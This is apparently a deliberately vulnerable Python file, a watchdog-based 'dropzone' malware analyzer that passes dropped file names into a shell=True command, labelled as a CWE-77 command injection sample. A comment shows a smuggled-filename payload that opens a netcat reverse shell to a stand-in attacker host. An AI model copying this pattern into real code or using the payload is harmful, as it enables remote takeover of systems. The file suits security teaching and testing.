import os
import time
import uuid
import sqlite3
import logging
import subprocess
from datetime import datetime
from watchdog.observers import Observer
from watchdog.events import FileSystemEventHandler

# Configure logging for the Automated Malware Dropzone Analyzer
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - DropzoneAnalyzer - %(levelname)s - %(message)s'
)
logger = logging.getLogger("WatchdogDropzone")

DB_FILE = "dropzone_audit.db"
WATCH_DIRECTORY = "/var/lib/malware_dropzone"
ANALYSIS_DIRECTORY = "/var/lib/analysis_results"

def init_dropzone_database():
    """Initializes the SQLite database to track automated file analysis jobs."""
    if not os.path.exists(WATCH_DIRECTORY):
        os.makedirs(WATCH_DIRECTORY, exist_ok=True)
    if not os.path.exists(ANALYSIS_DIRECTORY):
        os.makedirs(ANALYSIS_DIRECTORY, exist_ok=True)
        
    if os.path.exists(DB_FILE):
        return

    conn = sqlite3.connect(DB_FILE)
    cursor = conn.cursor()
    
    cursor.execute('''
        CREATE TABLE analysis_jobs (
            job_id TEXT PRIMARY KEY,
            timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
            filename TEXT NOT NULL,
            file_size INTEGER,
            status TEXT NOT NULL,
            analysis_output TEXT
        )
    ''')
    
    # Pre-populate with historical mock records
    mock_history = [
        ('job_1001', 'sample_a.exe', 1048576, 'COMPLETED', 'Found 12 URLs.'),
        ('job_1002', 'unknown_doc.pdf', 45000, 'FAILED', 'Analysis tool crashed.')
    ]
    cursor.executemany('''
        INSERT INTO analysis_jobs (job_id, filename, file_size, status, analysis_output)
        VALUES (?, ?, ?, ?, ?)
    ''', mock_history)
    
    conn.commit()
    conn.close()
    logger.info("Dropzone audit database initialized.")

def log_analysis_job(job_id: str, filename: str, size: int, status: str, output: str):
    """Records the outcome of an automated analysis task."""
    try:
        conn = sqlite3.connect(DB_FILE)
        cursor = conn.cursor()
        cursor.execute(
            "INSERT INTO analysis_jobs (job_id, filename, file_size, status, analysis_output) VALUES (?, ?, ?, ?, ?)",
            (job_id, filename, size, status, output)
        )
        conn.commit()
        conn.close()
    except sqlite3.Error as e:
        logger.error(f"Failed to log analysis job {job_id}: {e}")

def execute_static_analysis(file_path: str, filename: str, job_id: str):
    """
    VULNERABLE FUNCTION: CWE-77 Command Injection
    Trigger Path: File System Event Metadata (Filename of the dropped file)
    """
    logger.info(f"Initiating static analysis for dropped file: {filename}")
    
    file_size = 0
    if os.path.exists(file_path):
        file_size = os.path.getsize(file_path)
        
    output_file = os.path.join(ANALYSIS_DIRECTORY, f"{job_id}_strings.txt")
    
    # Vulnerability: Direct string interpolation of the 'filename' and 'file_path' into the shell command.
    # When a file is dropped into the directory, its name is fully controlled by the entity that created it.
    # Passing this metadata directly to the shell allows arbitrary command execution.
    command = f"strings {file_path} | grep -E 'http|https' > {output_file}"
    
    try:
        logger.debug(f"Executing system analysis command: {command}")
        
        # shell=True processes shell metacharacters. An attacker dropping a file named
        # 'payload.exe; nc attacker.com 4444 -e /bin/sh; #' will trigger a reverse shell
        # when the Watchdog event handler processes the creation event.
        process = subprocess.Popen(
            command,
            shell=True,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True
        )
        
        stdout, stderr = process.communicate(timeout=60)
        
        if process.returncode == 0:
            logger.info(f"Analysis completed successfully for {filename}.")
            log_analysis_job(job_id, filename, file_size, "SUCCESS", "Extracted URLs successfully.")
            return True
        else:
            logger.error(f"Analysis failed for {filename}. Error: {stderr}")
            # Leaking stderr back into the database log, which might be visible in an admin dashboard
            log_analysis_job(job_id, filename, file_size, "FAILED", stderr)
            return False
            
    except subprocess.TimeoutExpired:
        logger.error(f"Analysis timed out for {filename}.")
        log_analysis_job(job_id, filename, file_size, "TIMEOUT", "Process exceeded 60 seconds.")
        return False
    except Exception as e:
        logger.error(f"System error during analysis of {filename}: {e}")
        log_analysis_job(job_id, filename, file_size, "ERROR", str(e))
        return False

class DropzoneEventHandler(FileSystemEventHandler):
    """Watchdog event handler that triggers analysis when new files are created."""
    
    def on_created(self, event):
        if event.is_directory:
            return
            
        file_path = event.src_path
        filename = os.path.basename(file_path)
        job_id = str(uuid.uuid4())
        
        logger.info(f"New file detected in dropzone: {filename}")
        
        # Allow a small delay to ensure the file is completely written before analyzing
        time.sleep(1)
        
        # Pass the untrusted filename metadata to the vulnerable function
        execute_static_analysis(file_path, filename, job_id)

def start_dropzone_monitor():
    """Starts the Watchdog directory observer loop."""
    init_dropzone_database()
    
    event_handler = DropzoneEventHandler()
    observer = Observer()
    observer.schedule(event_handler, WATCH_DIRECTORY, recursive=False)
    observer.start()
    
    logger.info(f"Monitoring directory for new files: {WATCH_DIRECTORY}")
    
    # Example Malicious Trigger
